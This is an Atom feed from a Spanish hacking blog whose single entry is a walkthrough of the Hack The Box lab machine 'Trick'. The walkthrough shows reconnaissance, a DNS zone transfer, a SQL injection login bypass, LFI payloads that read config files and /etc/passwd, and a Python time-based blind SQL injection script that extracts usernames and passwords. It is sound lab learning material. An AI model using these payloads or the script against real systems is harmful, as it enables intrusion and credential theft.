<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-31T16:16:56-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog de Hacking</title><subtitle>Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
</subtitle><author><name>K0Hack</name></author><entry><title type="html">Maquina Retirada Trick de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/27/Trick.html" rel="alternate" type="text/html" title="Maquina Retirada Trick de Hack The Box (Necesario VIP)" /><published>2022-06-27T00:00:00-03:00</published><updated>2022-06-27T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/27/Trick</id><content type="html" xml:base="http://localhost:4000/2022/06/27/Trick.html">&lt;h1 id=&quot;trick--hack-the-box&quot;&gt;Trick ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.11.166       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -sC -sV -p -oN target 10.10.11.166&quot;&lt;/span&gt;
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
25/tcp open  smtp?
|_smtp-commands: Couldn&lt;span class=&quot;s1&quot;&gt;&apos;t establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Whatweb&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.129.116.251 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.129.116.251], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el puerto 53 DNS&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# dig axfr @10.10.11.166 trick.htb&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.11-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr @10.10.11.166 trick.htb
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 188 msec
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 10.10.11.166#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.11.166&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: dom jun 26 11:10:56 CEST 2022
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 6 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 231&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;preprod-payroll.trick.htb&lt;/code&gt;
Fuzzing&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# dirsearch -u http://preprod-payroll.trick.htb -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 404                                                                                       1 ⚙&lt;/span&gt;

  _|. _ _  _  _  _ _|_    v0.4.1
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_||| _&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_|| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Target: http://preprod-payroll.trick.htb/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:03:56] Starting: 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:05] 200 -    0B  - /ajax.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:05] 301 -  185B  - /assets  -&amp;gt;  http://preprod-payroll.trick.htb/assets/                                               
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:05] 403 -  571B  - /assets/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:07] 301 -  185B  - /database  -&amp;gt;  http://preprod-payroll.trick.htb/database/                             
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:07] 403 -  571B  - /database/                        
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:09] 200 -    2KB - /header.php                                                                             
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:09] 200 -  486B  - /home.php                     
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:10] 302 -    9KB - /index.php  -&amp;gt;  login.php                                                                        
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:10] 200 -    5KB - /login.php                                                                                             
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:13] 200 -  149B  - /readme.txt                                                                      
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12:04:16] 200 -    2KB - /users.php 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos enumerando el subdominio, encontramos en el login una inyeccion SQLI Blind TimeBased&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin&lt;span class=&quot;s1&quot;&gt;&apos; or 1=1-- - 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez accedemos a la web como administradores encontramos un LFI en la siguiente ruta:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://preprod-payroll.trick.htb/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;home
http://preprod-payroll.trick.htb/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/convert.base64-encode/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;db_connect
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recibimos el contenido de los archivos en base64&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat db-connection.php   &lt;/span&gt;
&amp;lt;?php 

&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new mysqli&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;localhost&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;remo&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;TrulyImpossiblePasswordLmao123&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;payroll_db&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;or die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Could not connect to mysql&quot;&lt;/span&gt;.mysqli_error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Profundizando en la Inyeccion SQL montamos un script para averiguar los datos username &amp;amp; password&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;signal&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pdb&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Saliendo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Saliendo...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Ctrl + C
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Saliendo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Variables Globales
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://preprod-payroll.trick.htb/ajax.php?action=login&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;abcdefghijklmnñopqrstuvwxyz&apos;&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sqli_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nombre de la Columna de Datos&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;position&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;character&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;s&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin&apos; or if(substr((select group_concat(username,0x3a,password) from users),%d,1)=&apos;%c&apos;,sleep(5),1)-- -&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;character&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
				&lt;span class=&quot;s&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;#&apos;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;--&amp;gt; %s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;character&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;sqli_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Uso exploit.py&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 exploit.py                                                                                                           &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;▃] Payload: &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;admin&apos; or if(substr((select group_concat(username,0x3a,password) from users),49,1)=&apos;z&apos;,sleep(5),1)-- -&quot;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.] Nombre de la Columna de Datos: enemigosss&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;superguccirainbowcake
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a seguir enumerando subdominios con wfuzz&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# wfuzz -c --hc=404 --hh=5480 -t 200 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &apos;Host: preprod-FUZZ.trick.htb&apos; http://preprod-payroll.trick.htb/ &lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: http://preprod-payroll.trick.htb/
Total requests: 4989

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload      
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000254:   200        178 L    631 W      9660 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;marketing&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos el siguiente subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;preprod-marketing.trick.htb&lt;/code&gt;
Procedemos a echar un vistazo y encontramos que tambien tiene un LFI&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://preprod-marketing.trick.htb/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....//....//....//....//....//....//....//....//etc/hosts

Output &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
127.0.0.1 localhost 127.0.1.1 trick 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a buscar el /etc/passwd&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd&lt;/span&gt;

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
&lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;:x:120:128::/var/cache/bind:/usr/sbin/nologin
&lt;span class=&quot;s2&quot;&gt;&quot;michael&quot;&lt;/span&gt;:x:1001:1001::/home/michael:/bin/bash
